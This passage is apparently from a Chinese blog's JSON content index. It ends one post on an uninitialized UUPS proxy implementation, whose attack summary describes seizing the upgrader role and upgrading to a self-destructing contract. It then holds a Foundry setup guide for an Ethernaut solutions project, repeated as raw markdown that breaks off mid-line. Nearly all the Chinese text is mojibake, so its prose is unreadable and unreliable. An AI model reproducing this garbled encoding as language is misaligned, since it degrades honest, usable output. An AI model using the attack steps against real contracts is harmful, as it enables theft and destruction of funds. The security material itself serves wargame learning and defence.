initializer &#123;</span><br><span class=\"line\">        // ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>OpenZeppelin çš„ <code>Initializable</code> åˆçº¦æä¾›äº†ä¸€ä¸ª <code>initializer</code> ä¿®é¥°ç¬¦ï¼Œå¯ä»¥å¾ˆå¥½åœ°è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>\n</li>\n<li><p><strong>æ„é€ å‡½æ•°ä¸­åˆå§‹åŒ–</strong>: å¯¹äºä¸å¯å‡çº§çš„åˆçº¦ï¼Œåº”åœ¨ <code>constructor</code> ä¸­å®Œæˆæ‰€æœ‰åˆå§‹åŒ–ï¼Œä»¥ç¡®ä¿åœ¨éƒ¨ç½²æ—¶å°±è®¾ç½®å¥½æ‰€æœ‰æƒå’Œå…³é”®å‚æ•°ã€‚</p>\n</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong>UUPS (Universal Upgradeable Proxy Standard)</strong>: EIP-1822 å®šä¹‰çš„ä¸€ç§ä»£ç†æ¨¡å¼ï¼Œå®ƒå°†å‡çº§é€»è¾‘æ”¾åœ¨å®ç°åˆçº¦ä¸­ï¼Œæ¯”æ—§çš„é€æ˜ä»£ç†æ¨¡å¼æ›´èŠ‚çœ Gasã€‚</li>\n<li><strong>EIP-1967</strong>: å®šä¹‰äº†ä»£ç†åˆçº¦ä¸­ç”¨äºå­˜å‚¨é€»è¾‘åˆçº¦åœ°å€å’Œç®¡ç†å‘˜åœ°å€çš„æ ‡å‡†å­˜å‚¨æ§½ä½ï¼Œä»¥é¿å…å­˜å‚¨å†²çªã€‚</li>\n<li><strong>æœªåˆå§‹åŒ–çš„ä»£ç†&#x2F;å®ç°</strong>: ä»£ç†åˆçº¦å®‰å…¨ä¸­ä¸€ä¸ªå¸¸è§çš„æ¼æ´ç±»åˆ«ã€‚æ— è®ºæ˜¯ä»£ç†æœ¬èº«è¿˜æ˜¯å…¶å®ç°åˆçº¦ï¼Œå¦‚æœå…¶åˆå§‹åŒ–å‡½æ•°å¯ä»¥è¢«ä»»ä½•äººè°ƒç”¨ï¼Œå°±ä¼šå¯¼è‡´ä¸¥é‡çš„å®‰å…¨é—®é¢˜ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>åœ¨ä½¿ç”¨ UUPS ä»£ç†æ¨¡å¼æ—¶ï¼Œä¸ä»…ä»£ç†éœ€è¦åˆå§‹åŒ–ï¼Œå…¶åº•å±‚çš„å®ç°åˆçº¦ä¹Ÿéœ€è¦è¢«æ­£ç¡®åœ°åˆå§‹åŒ–æˆ–ç¦ç”¨åˆå§‹åŒ–å‡½æ•°ã€‚</li>\n<li>å®ç°åˆçº¦æœ¬èº«æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ã€å¯ç›´æ¥äº¤äº’çš„åˆçº¦ï¼Œå¿…é¡»ç¡®ä¿å…¶å…¬å…±&#x2F;å¤–éƒ¨å‡½æ•°å—åˆ°ä¸ä»£ç†åˆçº¦ç›¸åŒçš„è®¿é—®æ§åˆ¶ä¿æŠ¤ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>æ‰¾åˆ°æœªè¢«åˆå§‹åŒ–çš„å®ç°åˆçº¦ã€‚</li>\n<li>ç›´æ¥è°ƒç”¨å…¶åˆå§‹åŒ–å‡½æ•°ä»¥è·å–ç‰¹æƒï¼ˆå¦‚ <code>upgrader</code> è§’è‰²ï¼‰ã€‚</li>\n<li>åˆ©ç”¨è·å¾—çš„ç‰¹æƒæ‰§è¡Œæ¶æ„æ“ä½œï¼ˆå¦‚å‡çº§åˆ°æ¶æ„å®ç°å¹¶è‡ªæ¯ï¼‰ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>ç¡®ä¿å®ç°åˆçº¦çš„æ„é€ å‡½æ•°æˆ–ä¸€ä¸ªä¸€æ¬¡æ€§çš„éƒ¨ç½²è„šæœ¬ä¼šè°ƒç”¨å…¶åˆå§‹åŒ–å‡½æ•°ï¼Œå¹¶è®¾ç½® <code>initialized</code> æ ‡å¿—ï¼Œé˜²æ­¢é‡å…¥ã€‚</li>\n<li>ä½¿ç”¨ç»è¿‡å®¡è®¡å’Œå¹¿æ³›ä½¿ç”¨çš„ä»£ç†å®ç°ï¼Œå¦‚ OpenZeppelin çš„ UUPS-Upgradeable åˆçº¦ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://eips.ethereum.org/EIPS/eip-1822\">EIP-1822: Universal Upgradeable Proxy Standard (UUPS)</a></li>\n<li><a href=\"https://docs.openzeppelin.com/upgrades-plugins/1.x/uups-proxies\">OpenZeppelin Docs: UUPS Proxies</a></li>\n</ul>\n"},{"title":"Foundry ç¯å¢ƒæ­å»ºä¸ Ethernaut é¡¹ç›®é…ç½®","date":"2025-01-25T06:05:00.000Z","updated":"2025-01-25T06:05:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"è¯¦ç»†ä»‹ç»å¦‚ä½•å®‰è£…å’Œé…ç½® Foundry å¼€å‘ç¯å¢ƒï¼Œä¸ºå­¦ä¹  Ethernaut æ™ºèƒ½åˆçº¦å®‰å…¨æŒ‘æˆ˜åšå¥½å‡†å¤‡ã€‚","_content":"\n# ğŸ› ï¸ Foundry ç¯å¢ƒæ­å»ºä¸ Ethernaut é¡¹ç›®é…ç½®\n\n> åœ¨å¼€å§‹ Ethernaut å®‰å…¨æŒ‘æˆ˜ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦æ­å»ºä¸€ä¸ªå®Œæ•´çš„ Foundry å¼€å‘ç¯å¢ƒã€‚æœ¬æ–‡å°†è¯¦ç»†ä»‹ç»ä»é›¶å¼€å§‹çš„å®Œæ•´é…ç½®æµç¨‹ã€‚\n\n## ğŸ“š ä»€ä¹ˆæ˜¯ Foundry?\n\n**Foundry** æ˜¯ä¸€ä¸ªç”¨ Rust ç¼–å†™çš„å¿«é€Ÿã€å¯ç§»æ¤å’Œæ¨¡å—åŒ–çš„ä»¥å¤ªåŠå¼€å‘å·¥å…·åŒ…ï¼ŒåŒ…å«ï¼š\n\n- **Forge**: æµ‹è¯•æ¡†æ¶\n- **Cast**: ç‘å£«å†›åˆ€èˆ¬çš„ RPC å·¥å…·\n- **Anvil**: æœ¬åœ°æµ‹è¯•ç½‘ç»œ\n- **Chisel**: Solidity REPL\n\n### ä¸å…¶ä»–å·¥å…·å¯¹æ¯”\n\n| å·¥å…· | è¯­è¨€ | æµ‹è¯•é€Ÿåº¦ | é…ç½®å¤æ‚åº¦ | ç¤¾åŒºæ”¯æŒ |\n|------|------|----------|------------|----------|\n| **Foundry** | Rust | â­â­â­â­â­ | â­â­â˜†â˜†â˜† | â­â­â­â­â˜† |\n| Hardhat | JavaScript | â­â­â­â˜†â˜† | â­â­â­â˜†â˜† | â­â­â­â­â­ |\n| Truffle | JavaScript | â­â­â˜†â˜†â˜† | â­â­â­â­â˜† | â­â­â­â˜†â˜† |\n\n## ğŸš€ Foundry å®‰è£…\n\n### æ–¹æ³•ä¸€ï¼šä½¿ç”¨ Foundryup (æ¨è)\n\n```bash\n# ä¸‹è½½å¹¶å®‰è£… Foundryup\ncurl -L https://foundry.paradigm.xyz | bash\n\n# é‡æ–°åŠ è½½ shell æˆ–é‡å¯ç»ˆç«¯\nsource ~/.bashrc  # æˆ– source ~/.zshrc\n\n# å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„ Foundry\nfoundryup\n\n# éªŒè¯å®‰è£…\nforge --version\ncast --version\nanvil --version\n```\n\n### æ–¹æ³•äºŒï¼šä»æºç ç¼–è¯‘\n\n```bash\n# å…‹éš† Foundry ä»“åº“\ngit clone https://github.com/foundry-rs/foundry\ncd foundry\n\n# ç¼–è¯‘å®‰è£… (éœ€è¦ Rust ç¯å¢ƒ)\ncargo build --release\ncargo install --path ./crates/forge --bin forge\ncargo install --path ./crates/cast --bin cast\ncargo install --path ./crates/anvil --bin anvil\n```\n\n### æ–¹æ³•ä¸‰ï¼šä½¿ç”¨åŒ…ç®¡ç†å™¨\n\n```bash\n# macOS (Homebrew)\nbrew install foundry\n\n# Ubuntu/Debian (éœ€è¦æ·»åŠ  PPA)\n# æš‚ä¸æ”¯æŒï¼Œå»ºè®®ä½¿ç”¨æ–¹æ³•ä¸€\n\n# Windows (éœ€è¦ WSL)\n# åœ¨ WSL ä¸­æ‰§è¡Œæ–¹æ³•ä¸€çš„æ­¥éª¤\n```\n\n## ğŸ“ Ethernaut é¡¹ç›®ç»“æ„\n\n### å…‹éš†é¡¹ç›®\n\n```bash\n# å…‹éš† Ethernaut Foundry Solutions é¡¹ç›®\ngit clone https://github.com/XuHugo/Ethernaut-Foundry-Solutions.git\ncd Ethernaut-Foundry-Solutions\n\n# æŸ¥çœ‹é¡¹ç›®ç»“æ„\ntree -L 2\n```\n\n### é¡¹ç›®ç›®å½•ç»“æ„\n\n```\nEthernaut-Foundry-Solutions/\nâ”œâ”€â”€ foundry.toml          # Foundry é…ç½®æ–‡ä»¶\nâ”œâ”€â”€ .gitmodules          # Git å­æ¨¡å—é…ç½®\nâ”œâ”€â”€ README.md            # é¡¹ç›®è¯´æ˜\nâ”œâ”€â”€ lib/                 # ä¾èµ–åº“\nâ”‚   â”œâ”€â”€ forge-std/       # Foundry æ ‡å‡†åº“\nâ”‚   â””â”€â”€ openzeppelin-contracts/  # OpenZeppelin åˆçº¦åº“\nâ”œâ”€â”€ src/                 # æºç ç›®å½•\nâ”‚   â”œâ”€â”€ Fallback.sol     # å…³å¡åŸå§‹åˆçº¦\nâ”‚   â”œâ”€â”€ Fallout.sol\nâ”‚   â””â”€â”€ ...\nâ”œâ”€â”€ test/                # æµ‹è¯•ç›®å½•\nâ”‚   â”œâ”€â”€ FallbackTest.sol # æ”»å‡»æµ‹è¯•åˆçº¦\nâ”‚   â”œâ”€â”€ FalloutTest.sol\nâ”‚   â””â”€â”€ ...\nâ”œâ”€â”€ script/              # éƒ¨ç½²è„šæœ¬\nâ””â”€â”€ solutions/           # è§£é¢˜è¯´æ˜æ–‡æ¡£\n    â”œâ”€â”€ 01_Fallback_zh.md\n    â””â”€â”€ ...\n```\n\n## âš™ï¸ é¡¹ç›®é…ç½®\n\n### Foundry é…ç½®æ–‡ä»¶\n\næŸ¥çœ‹ `foundry.toml` é…ç½®ï¼š\n\n```toml\n[profile.default]\nsrc = \"src\"\nout = \"out\"\nlibs = [\"lib\"]\nsolc = \"0.8.19\"\n\n# Etherscan API é…ç½® (å¯é€‰)\n[etherscan]\nmainnet = { key = \"${API_KEY_ETHERSCAN}\" }\nsepolia = { key = \"${API_KEY_ETHERSCAN}\" }\n\n# RPC ç«¯ç‚¹é…ç½®\n[rpc_endpoints]\nmainnet = \"https://rpc.ankr.com/eth\"\nsepolia = \"https://rpc.ankr.com/eth_sepolia\"\n```\n\n### å®‰è£…ä¾èµ–\n\n```bash\n# å®‰è£…é¡¹ç›®ä¾èµ–\nforge install\n\n# æ‰‹åŠ¨å®‰è£…ç‰¹å®šä¾èµ– (å¦‚æœéœ€è¦)\nforge install openzeppelin/openzeppelin-contracts\nforge install foundry-rs/forge-std\n\n# æ›´æ–°ä¾èµ–åˆ°æœ€æ–°ç‰ˆæœ¬\nforge update\n```\n\n## ğŸ§ª åŸºæœ¬ä½¿ç”¨\n\n### ç¼–è¯‘åˆçº¦\n\n```bash\n# ç¼–è¯‘æ‰€æœ‰åˆçº¦\nforge build\n\n# ç¼–è¯‘ç‰¹å®šåˆçº¦\nforge build src/Fallback.sol\n\n# æŸ¥çœ‹ç¼–è¯‘è¾“å‡º\nls out/\n```\n\n### è¿è¡Œæµ‹è¯•\n\n```bash\n# è¿è¡Œæ‰€æœ‰æµ‹è¯•\nforge test\n\n# è¿è¡Œç‰¹å®šæµ‹è¯•åˆçº¦\nforge test --match-contract FallbackTest\n\n# è¯¦ç»†è¾“å‡º (å¤šä¸ª v å¢åŠ è¯¦ç»†ç¨‹åº¦)\nforge test --match-contract FallbackTest -vvv\n\n# è¿è¡Œç‰¹å®šæµ‹è¯•å‡½æ•°\nforge test --match-test testFallbackExploit -vvv\n\n# æ˜¾ç¤º gas æŠ¥å‘Š\nforge test --gas-report\n```\n\n### ä½¿ç”¨ Anvil æœ¬åœ°æµ‹è¯•ç½‘\n\n```bash\n# å¯åŠ¨æœ¬åœ°æµ‹è¯•ç½‘ (æ–°ç»ˆç«¯)\nanvil\n\n# åœ¨å¦ä¸€ä¸ªç»ˆç«¯ä¸­ï¼Œé’ˆå¯¹æœ¬åœ°ç½‘ç»œè¿è¡Œæµ‹è¯•\nforge test --fork-url http://localhost:8545\n```\n\n## ğŸ”§ å¸¸ç”¨ Foundry å‘½ä»¤\n\n### Forge å‘½ä»¤\n\n```bash\n# é¡¹ç›®ç®¡ç†\nforge init my-project          # åˆå§‹åŒ–æ–°é¡¹ç›®\nforge build                    # ç¼–è¯‘åˆçº¦\nforge clean                    # æ¸…ç†ç¼–è¯‘è¾“å‡º\n\n# æµ‹è¯•ç›¸å…³\nforge test                     # è¿è¡Œæµ‹è¯•\nforge test --watch            # ç›‘è§†æ–‡ä»¶å˜åŒ–å¹¶è‡ªåŠ¨æµ‹è¯•\nforge coverage                # ä»£ç è¦†ç›–ç‡æŠ¥å‘Š\n\n# ä¾èµ–ç®¡ç†\nforge install <dependency>     # å®‰è£…ä¾èµ–\nforge remove <dependency>     # ç§»é™¤ä¾èµ–\nforge update                  # æ›´æ–°ä¾èµ–\n\n# ä»£ç æ ¼å¼åŒ–\nforge fmt                     # æ ¼å¼åŒ– Solidity ä»£ç \n```\n\n### Cast å‘½ä»¤\n\n```bash\n# æŸ¥è¯¢åŒºå—é“¾ä¿¡æ¯\ncast block-number             # è·å–æœ€æ–°åŒºå—å·\ncast balance <address>        # æŸ¥è¯¢åœ°å€ä½™é¢\ncast storage <address> <slot> # è¯»å–å­˜å‚¨æ§½\n\n# è°ƒç”¨åˆçº¦\ncast call <address> <signature> [args]  # åªè¯»è°ƒç”¨\ncast send <address> <signature> [args]  # çŠ¶æ€å˜æ›´è°ƒç”¨\n\n# å·¥å…·å‡½æ•°\ncast keccak \"function_signature()\"      # è®¡ç®—å‡½æ•°é€‰æ‹©å™¨\ncast abi-encode \"func(uint256)\" 123     # ABI ç¼–ç \n```\n\n### Anvil å‘½ä»¤\n\n```bash\n# å¯åŠ¨æœ¬åœ°æµ‹è¯•ç½‘\nanvil                         # é»˜è®¤é…ç½®\nanvil --port 8545            # æŒ‡å®šç«¯å£\nanvil --accounts 20          # æŒ‡å®šè´¦æˆ·æ•°é‡\nanvil --balance 1000         # æ¯ä¸ªè´¦æˆ·åˆå§‹ä½™é¢ (ETH)\n\n# ä»ç‰¹å®šçŠ¶æ€åˆ†å‰\nanvil --fork-url https://rpc.ankr.com/eth\nanvil --fork-url https://rpc.ankr.com/eth --fork-block-number 19000000\n```\n\n## ğŸ¯ Ethernaut ä¸“ç”¨é…ç½®\n\n### ç¯å¢ƒå˜é‡é…ç½®\n\nåˆ›å»º `.env` æ–‡ä»¶ï¼š\n\n```bash\n# .env æ–‡ä»¶\nETHERSCAN_API_KEY=your_etherscan_api_key\nMAINNET_RPC_URL=https://rpc.ankr.com/eth\nSEPOLIA_RPC_URL=https://rpc.ankr.com/eth_sepolia\nPRIVATE_KEY=your_private_key_for_testing\n```\n\nåŠ è½½ç¯å¢ƒå˜é‡ï¼š\n\n```bash\n# åœ¨ shell ä¸­åŠ è½½\nsource .env\n\n# æˆ–åœ¨ foundry.toml ä¸­é…ç½®è‡ªåŠ¨åŠ è½½\n[profile.default]\nenv_file = \".env\"\n```\n\n### æµ‹è¯•æ¨¡æ¿\n\nåˆ›å»ºæ ‡å‡†æµ‹è¯•æ–‡ä»¶æ¨¡æ¿ï¼š\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/TargetContract.sol\";\n\ncontract TargetContractTest is Test {\n    TargetContract public instance;\n    address public attacker = makeAddr(\"attacker\");\n    \n    function setUp() public {\n        // éƒ¨ç½²ç›®æ ‡åˆçº¦\n        instance = new TargetContract();\n        \n        // åˆå§‹åŒ–æ”»å‡»è€…è´¦æˆ·\n        vm.deal(attacker, 10 ether);\n    }\n    \n    function testExploit() public {\n        vm.startPrank(attacker);\n        \n        // æ”»å‡»é€»è¾‘\n        \n        vm.stopPrank();\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertTrue(/* éªŒè¯æ¡ä»¶ */);\n    }\n}\n```\n\n## ğŸ› å¸¸è§é—®é¢˜è§£å†³\n\n### ç¼–è¯‘é”™è¯¯\n\n```bash\n# æ¸…ç†å¹¶é‡æ–°ç¼–è¯‘\nforge clean && forge build\n\n# æ£€æŸ¥ Solidity ç‰ˆæœ¬å…¼å®¹æ€§\nforge build --force\n\n# æŸ¥çœ‹è¯¦ç»†é”™è¯¯ä¿¡æ¯\nforge build --verbose\n```\n\n### ä¾èµ–é—®é¢˜\n\n```bash\n# é‡æ–°å®‰è£…ä¾èµ–\nrm -rf lib/\nforge install\n\n# æ£€æŸ¥ Git å­æ¨¡å—çŠ¶æ€\ngit submodule status\ngit submodule update --init --recursive\n```\n\n### æµ‹è¯•å¤±è´¥\n\n```bash\n# å¢åŠ è¯¦ç»†è¾“å‡º\nforge test -vvvv\n\n# ä½¿ç”¨è°ƒè¯•å™¨\nforge test --debug <test_function>\n\n# æ£€æŸ¥ gas ä½¿ç”¨æƒ…å†µ\nforge test --gas-report\n```\n\n## ğŸ“š è¿›é˜¶é…ç½®\n\n### å¤šç‰ˆæœ¬ Solidity æ”¯æŒ\n\n```toml\n# foundry.toml\n[profile.default]\nsolc = \"0.8.19\"\n\n[profile.legacy]\nsolc = \"0.6.12\"\n```\n\n### è‡ªå®šä¹‰æµ‹è¯•é…ç½®\n\n```toml\n[profile.default.fuzz]\nruns = 1000\nmax_test_rejects = 65536\n\n[profile.default.invariant]\nruns = 256\ndepth = 32\n```\n\n### Gas ä¼˜åŒ–è®¾ç½®\n\n```toml\n[profile.default.optimizer]\nenabled = true\nruns = 200\n\n[profile.default.model_checker]\ncontracts = { \"/path/to/project/src/Contract.sol\" = [ \"Contract\" ] }\nengine = \"chc\"\ntargets = [ \"assert\", \"underflow\", \"overflow\", \"divByZero\" ]\n```\n\n## ğŸ“ æ€»ç»“\n\nç°åœ¨æ‚¨å·²ç»å®Œæˆäº† Foundry å¼€å‘ç¯å¢ƒçš„æ­å»ºï¼Œå¯ä»¥å¼€å§‹ Ethernaut å®‰å…¨æŒ‘æˆ˜çš„å­¦ä¹ ä¹‹æ—…äº†ï¼\n\n### ä¸‹ä¸€æ­¥ï¼š\n\n1. **ç†Ÿæ‚‰ Foundry åŸºæœ¬å‘½ä»¤**\n2. **è¿è¡Œç¬¬ä¸€ä¸ªæµ‹è¯•**: `forge test --match-contract FallbackTest -vvv`\n3. **å¼€å§‹å­¦ä¹ **: [Level 1 - Fallback](/2025/01/25/ethernaut-level-01-fallback/)\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[Foundry å®˜æ–¹æ–‡æ¡£](https://book.getfoundry.sh/)**\n- **[Foundry GitHub](https://github.com/foundry-rs/foundry)**\n- **[ä¸‹ä¸€ç¯‡: Level 1 - Fallback](/2025/01/25/ethernaut-level-01-fallback/)**\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n\n---\n\n*å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ã€‚æŒæ¡å¥½å·¥å…·ï¼Œæ‰èƒ½æ›´å¥½åœ°å­¦ä¹ æ™ºèƒ½åˆçº¦å®‰å…¨ã€‚* ğŸ”§","source":"_posts/foundry-setup-guide.md","raw":"---\ntitle: 'Foundry ç¯å¢ƒæ­å»ºä¸ Ethernaut é¡¹ç›®é…ç½®'\ndate: 2025-01-25 14:05:00\nupdated: 2025-01-25 14:05:00\ncategories:\n  - Web3å¼€å‘\n  - å·¥å…·é…ç½®\n  - Ethernaut\ntags:\n  - Foundry\n  - ç¯å¢ƒæ­å»º\n  - Ethernaut\n  - Solidity\n  - Web3å¼€å‘\n  - æµ‹è¯•æ¡†æ¶\nseries: Ethernaut Foundry Solutions\nexcerpt: \"è¯¦ç»†ä»‹ç»å¦‚ä½•å®‰è£…å’Œé…ç½® Foundry å¼€å‘ç¯å¢ƒï¼Œä¸ºå­¦ä¹  Ethernaut æ™ºèƒ½åˆçº¦å®‰å…¨æŒ‘æˆ˜åšå¥½å‡†å¤‡ã€‚\"\n---\n\n# ğŸ› ï¸ Foundry ç¯å¢ƒæ­å»ºä¸ Ethernaut é¡¹ç›®é…ç½®\n\n> åœ¨å¼€å§‹ Ethernaut å®‰å…¨æŒ‘æˆ˜ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦æ­å»ºä¸€ä¸ªå®Œæ•´çš„ Foundry å¼€å‘ç¯å¢ƒã€‚æœ¬æ–‡å°†è¯¦ç»†ä»‹ç»ä»é›¶å¼€å§‹çš„å®Œæ•´é…ç½®æµç¨‹ã€‚\n\n## ğŸ“š ä»€ä¹ˆæ˜¯ Foundry?\n\n**Foundry** æ˜¯ä¸€ä¸ªç”¨ Rust ç¼–å†™çš„å¿«é€Ÿã€å¯ç§»æ¤å’Œæ¨¡å—åŒ–çš„ä»¥å¤ªåŠå¼€å‘å·¥å…·åŒ…ï¼ŒåŒ…å«ï¼š\n\n- **Forge**: æµ‹è¯•æ¡†æ¶\n- **Cast**: ç‘å£«å†›åˆ€èˆ¬çš„ RPC å·¥å…·\n- **Anvil**: æœ¬åœ°æµ‹è¯•ç½‘ç»œ\n- **Chisel**: Solidity REPL\n\n### ä¸å…¶ä»–å·¥å…·å¯¹æ¯”\n\n| å·¥å…· | è¯­è¨€ | æµ‹è¯•é€Ÿåº¦ | é…ç½®å¤æ‚åº¦ | ç¤¾åŒºæ”¯æŒ |\n|------|------|----------|------------|----------|\n| **Foundry** | Rust | â­â­â­â­â­ | â­â­â˜†â˜†â˜† | â­â­â­â­â˜† |\n| Hardhat | JavaScript | â­â­â­â˜†â˜† | â­â­â­â˜†â˜† | â­â­â­â­â­ |\n| Truffle | JavaScript | â­â­â˜†â˜†â˜† | â­â­â­â­â˜† | â­â­â­â˜†â˜† |\n\n## ğŸš€ Foundry å®‰è£…\n\n### æ–¹æ³•ä¸€ï¼šä½¿ç”¨ Foundryup (æ¨è)\n\n```bash\n# ä¸‹è½½å¹¶å®‰è£… Foundryup\ncurl -L https://foundry.paradigm.xyz | bash\n\n# é‡æ–°åŠ è½½ shell æˆ–é‡å¯ç»ˆç«¯\nsource ~/.bashrc  # æˆ– source ~/.zshrc\n\n# å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„ Foundry\nfoundryup\n\n# éªŒè¯å®‰è£…\nforge --version\ncast --version\nanvil --version\n```\n\n### æ–¹æ³•äºŒï¼šä»æºç ç¼–è¯‘\n\n```bash\n# å…‹éš† Foundry ä»“åº“\ngit clone https://github.com/foundry-rs/foundry\ncd foundry\n\n# ç¼–è¯‘å®‰è£… (éœ€è¦ Rust ç¯å¢ƒ)\ncargo build --release\ncargo install --path ./crates/forge --bin forge\ncargo install --path ./crates/cast --bin cast\ncargo install --path ./crates/anvil --bin anvil\n```\n\n### æ–¹æ³•ä¸‰ï¼šä½¿ç”¨åŒ…ç®¡ç†å™¨\n\n```bash\n# macOS (Homebrew)\nbrew install foundry\n\n# Ubuntu/Debian (éœ€è¦æ·»åŠ  PPA)\n# æš‚ä¸æ”¯æŒï¼Œå»ºè®®ä½¿ç”¨æ–¹æ³•ä¸€\n\n# Windows (éœ€è¦ WSL)\n# åœ¨ WSL ä¸­æ‰§è¡Œæ–¹æ³•ä¸€çš„æ­¥éª¤\n```\n\n## ğŸ“ Ethernaut é¡¹ç›®ç»“æ„\n\n### å…‹éš†é¡¹ç›®\n\n```bash\n# å…‹éš† Ethernaut Foundry Solutions é¡¹ç›®\ngit clone https://github.com/XuHugo/Ethernaut-Foundry-Solutions.git\ncd Ethernaut-Foundry-Solutions\n\n# æŸ¥çœ‹é¡¹ç›®ç»“æ„\ntree -L 2\n```\n\n### é¡¹ç›®ç›®å½•ç»“æ„\n\n```\nEthernaut-Foundry-Solutions/\nâ”œâ”€â”€ foundry.toml          # Foundry é…ç½®æ–‡ä»¶\nâ”œâ”€â”€ .gitmodules          # Git å­æ¨¡å—é…ç½®\nâ”œâ”€â”€ README.md            # é¡¹ç›®è¯´æ˜\nâ”œâ”€â”€ lib/                 # ä¾èµ–åº“\nâ”‚   â”œâ”€â”€ forge-std/       # Foundry æ ‡å‡†åº“\nâ”‚   â””â”€â”€ openzeppelin-contracts/  # OpenZeppelin åˆçº¦åº“\nâ”œâ”€â”€ src/                 # æºç ç›®å½•\nâ”‚   â”œâ”€â”€ Fallback.sol     # å…³å¡åŸå§‹åˆçº¦\nâ”‚   â”œâ”€â”€ Fallout.sol\nâ”‚   â””â”€â”€ ...\nâ”œâ”€â”€ test/                # æµ‹è¯•ç›®å½•\nâ”‚   â”œâ”€â”€ FallbackTest.sol # æ”»å‡»æµ‹è¯•åˆçº¦\nâ”‚   â”œâ”€â”€ FalloutTest.sol\nâ”‚   â””â”€â”€ ...\nâ”œâ”€â”€ script/              # éƒ¨ç½²è„šæœ¬\nâ””â”€â”€ solutions/           # è§£é¢˜è¯´æ˜æ–‡æ¡£\n    â”œâ”€â”€ 01_Fallback_zh.md\n    â””â”€â”€ ...\n```\n\n## âš™ï¸ é¡¹ç›®é…ç½®\n\n### Foundry é…ç½®æ–‡ä»¶\n\næŸ¥çœ‹ `foundry.toml` é…ç½®ï¼š\n\n```toml\n[profile.default]\nsrc = \"src\"\nout = \"out\"\nlibs = [\"lib\"]\nsolc = \"0.8.19\"\n\n# Etherscan API é…ç½® (å¯é€‰)\n[etherscan]\nmainnet = { key = \"${API_KEY_ETHERSCAN}\" }\nsepolia = { key = \"${API_KEY_ETHERSCAN}\" }\n\n# RPC ç«¯ç‚¹é…ç½®\n[rpc_endpoints]\nmainnet = \"https://rpc.ankr.com/eth\"\nsepolia = \"https://rpc.ankr.com/eth_sepolia\"\n```\n\n### å®‰è£…ä¾èµ–\n\n```bash\n# å®‰è£…é¡¹ç›®ä¾èµ–\nforge install\n\n# æ‰‹åŠ¨å®‰è£…ç‰¹å®šä¾èµ– (å¦‚æœéœ€è¦)\nforge install openzeppelin/openzeppelin-contracts\nforge install foundry-rs/forge-std\n\n# æ›´æ–°ä¾èµ–åˆ°æœ€æ–°ç‰ˆæœ¬\nforge update\n```\n\n## ğŸ§ª åŸºæœ¬ä½¿ç”¨\n\n### ç¼–è¯‘åˆçº¦\n\n```bash\n# ç¼–è¯‘æ‰€æœ‰åˆçº¦\nforge build\n\n# ç¼–è¯‘ç‰¹å®šåˆçº¦\nforge build src/Fallback.sol\n\n# æŸ¥çœ‹ç¼–è¯‘è¾“å‡º\nls out/\n```\n\n### è¿è¡Œæµ‹è¯•\n\n```bash\n# è¿è¡Œæ‰€æœ‰æµ‹è¯•\nforge test\n\n# è¿è¡Œç‰¹å®šæµ‹è¯•åˆçº¦\nforge test --match-contract FallbackTest\n\n# è¯¦ç»†è¾“å‡º (å¤šä¸ª v å¢åŠ è¯¦ç»†ç¨‹åº¦)\nforge test --match-contract FallbackTest -vvv\n\n# è¿è¡Œç‰¹å®šæµ‹è¯•å‡½æ•°\nforge test --match-test testFallbackExploit -vvv\n\n# æ˜¾ç¤º gas æŠ¥å‘Š\nforge test --gas-report\n```\n\n### ä½¿ç”¨ Anvil æœ¬åœ°æµ‹è¯•ç½‘\n\n```bash\n# å¯åŠ¨æœ¬åœ°æµ‹è¯•ç½‘ (æ–°ç»ˆç«¯)\nanvil\n\n# åœ¨å¦ä¸€ä¸ªç»ˆç«¯ä¸­ï¼Œé’ˆå¯¹æœ¬åœ°ç½‘ç»œè¿è¡Œæµ‹è¯•\nforge test --fork-url http://localhost:8545\n```\n\n## ğŸ”§ å¸¸ç”¨ Foundry å‘½ä»¤\n\n### Forge å‘½ä»¤\n\n```bash\n# é¡¹ç›®ç®¡ç†\nforge init my-project          # åˆå§‹åŒ–æ–°é¡¹ç›®\nforge build                    # ç¼–è¯‘åˆçº¦\nforge clean                    # æ¸…ç†ç¼–è¯‘è¾“å‡º\n\n# æµ‹è¯•ç›¸å…³\nforge test                     # è¿è¡Œæµ‹è¯•\nforge test --watch            # ç›‘è§†æ–‡ä»¶å˜åŒ–å¹¶è‡ªåŠ¨æµ‹è¯•\nforge coverage                # ä»£ç è¦†ç›–ç‡æŠ¥å‘Š\n\n# 